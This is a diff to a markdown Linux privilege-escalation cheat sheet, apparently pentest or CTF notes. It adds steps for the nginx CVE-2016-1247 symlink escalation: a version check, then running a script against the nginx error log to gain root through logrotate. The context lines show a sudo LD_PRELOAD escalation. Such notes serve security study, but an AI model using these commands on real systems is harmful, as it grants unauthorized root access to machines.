@@ -387,7 +387,19 @@ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
 ````
 sudo LD_PRELOAD=/tmp/x.so apache2
 ````
-- 5. In command prompt type: id
+- 5. In command prompt type: `id`
+### SUID SYMLINKS CVE-2016-1247
+- Detection
+````
+dpkg -l | grep nginx
+````
+- Looking for installed nginx version is below 1.6.2-5+deb8u3
+- Required you to be the www-data user!
+- Run:
+````
+/tmp/nginxed-root.sh /var/log/nginx/error.log
+````
+- System will wait for logrotate to execute, become root user
 ### Cron Jobs -File permissions
 - Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
 - Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.
